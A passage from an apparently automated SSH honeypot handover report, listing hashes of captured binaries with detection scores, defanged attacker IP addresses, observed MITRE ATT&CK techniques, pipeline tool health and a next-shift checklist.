| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.39.80[.]77` | BR | Anderson Gustavo Neves Gomes - ME | **100** ⚠️ | 22 |
| `186.235.193[.]170` | BR | VERO S.A | **100** ⚠️ | 47 |
| `14.103.118[.]226` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `43.164.195[.]69` | BR | ACEVILLE PTE.LTD. | **100** ⚠️ | 10 |
| `45.91.64[.]7` | RU | F6 | **100** ⚠️ | 50 |
| `66.240.236[.]116` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `14.103.118[.]248` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `203.83.231[.]93` | CN | CHINANET Guangdong province network | **100** ⚠️ | 49 |
| `112.53.70[.]99` | CN | China Mobile Communications Corporation | **100** ⚠️ | 0 |
| `117.245.142[.]93` | IN | BSNL GSM North Zone, O/o Sr GM (CMTS), NC, Chandigarh | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 43 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 10 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 52 cases |
| Tool 34  | Credential Extractor        | ✅ 16 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 12 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (3.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 10 recon entry/entries in table (2 group(s) consolidating 36 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-06T09:06:52Z_
